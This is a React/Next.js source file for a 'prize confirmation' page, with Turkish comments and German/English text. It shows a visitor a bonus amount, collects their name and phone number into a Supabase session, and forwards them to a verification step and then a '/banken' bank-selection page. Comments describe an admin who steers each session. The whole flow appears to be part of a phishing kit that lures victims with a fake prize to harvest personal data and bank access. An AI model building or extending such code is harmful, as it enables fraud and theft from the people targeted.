"use client";

import { useEffect, useState, useMemo } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string;
};

export function WinFlow({ sessionId }: Props) {
  
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number | null>(null);
  const [currency, setCurrency] = useState<string>("€");
  const [loading, setLoading] = useState(true);
  const [showModal] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("amount, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Sitzung nicht gefunden oder Konfiguration ungueltig.");
        setLoading(false);
        return;
      }

      setAmount(data.amount ?? 0);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      if (fd.currency) setCurrency(fd.currency);
      setFirstName(fd.firstName ?? "");
      setLastName(fd.lastName ?? "");
      setPhone(fd.phone ?? "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setSaving(true);
    setError(null);

    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
    let baseFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* fresh okuma basarisizsa state ile devam et */
    }

    const nextForm = {
      ...baseFormData,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
      pending_profile: false,
    };

    // Landing taslagindan gelen session (pending_profile=true idi) ->
    // verify -> wheel -> banken akisina girsin. Admin'in profil yeniden istedigi
    // session'lar eski davranisi korusun: direkt banken.
    const nextStep = baseFormData.pending_profile === true ? "verify" : "banken";

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ is_hidden: false, form_data: nextForm, current_step: nextStep })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Speichern fehlgeschlagen. Bitte versuchen Sie es erneut.");
      return;
    }
    setSessionFormData(nextForm);
    try {
      persistActiveSession(sessionId);
      localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
    } catch {
      /* storage ops are best-effort */
    }
    setProcessing(true);
    window.setTimeout(() => {
      setProcessing(false);
      // ⭐ FLASH YOK: window.location.href → window.location.replace (stack temiz, geri tuşunda flash YOK)
      try {
        if (nextStep === "verify") {
          const routeId =
            window.location.pathname.split("/")[2] || sessionId;
          window.location.replace(
            `/verify?session=${encodeURIComponent(routeId)}`,
          );
        } else {
          window.location.replace("/banken");
        }
      } catch {}
    }, 50);
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <DemoShell title="Konfiguration" subtitle="Systemumgebung">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000] border-t-transparent" />
        </div>
      </div>
    );
  }

  if (error && amount === null) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">{error}</p>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      {showModal ? (
        <div
          role="dialog"
          aria-modal="true"
          className="pak-form-card w-full max-w-[920px]"
        >
          <div className="pak-form-inner px-4 pb-4 pt-4 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
            <div className="space-y-4 sm:space-y-5">
              <div className="flex items-center justify-between gap-2.5 sm:gap-4">
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
                <div className="pak-form-amount inline-flex min-w-0 flex-1 px-3 py-2.5 sm:max-w-[18rem] sm:flex-none sm:px-5 sm:py-3">
                  <div className="pak-form-amount-label">
                    <div>Your</div>
                    <div>Bonusbetrag</div>
                  </div>
                  <div className="pak-form-amount-divider" />
                  <div className="pak-form-amount-value">
                    {currency}{amount?.toLocaleString("en-AU")}
                  </div>
                </div>
              </div>

              <div className="max-w-[27rem]">
                <h2 className="pak-form-title">Complete your entry</h2>
                <p className="pak-form-subtitle mt-2 sm:mt-3">
                  Enter your details to complete your prize confirmation.
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="mt-4 space-y-3 sm:mt-7 sm:space-y-6">
              <div className="grid grid-cols-2 gap-3 sm:gap-6">
                <label className="pak-form-label">
                  {settings.profile_firstname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      autoComplete="given-name"
                    />
                  </div>
                </label>
                <label className="pak-form-label">
                  {settings.profile_lastname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      autoComplete="family-name"
                    />
                  </div>
                </label>
              </div>
              <label className="pak-form-label">
                {settings.profile_phone_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M6.6 3.8h2.6l1.2 4.3-1.6 1.6a15.9 15.9 0 0 0 5.5 5.5l1.6-1.6 4.3 1.2v2.6a1.9 1.9 0 0 1-2.1 1.9A16.2 16.2 0 0 1 4.7 6a1.9 1.9 0 0 1 1.9-2.2Z" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    type="tel"
                    className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    autoComplete="tel"
                  />
                </div>
              </label>

              <div className="flex flex-col gap-2 pt-1 sm:gap-4 sm:pt-2 md:flex-row md:items-center md:justify-between">
                <div className="pak-form-security">
                  <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                  </svg>
                  <span>Ihre Daten werden sicher verarbeitet.</span>
                </div>

                <button
                  type="submit"
                  disabled={saving || processing}
                  className="pak-form-button min-h-[3.55rem] w-full px-5 text-base sm:min-h-[4.25rem] sm:px-6 sm:text-xl md:w-[24rem]"
                >
                  {processing ? "Wird verarbeitet..." : saving ? "Wird gespeichert..." : settings.profile_button}
                </button>
              </div>

              {error ? <p className="text-sm font-medium text-red-400">{error}</p> : null}
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
}
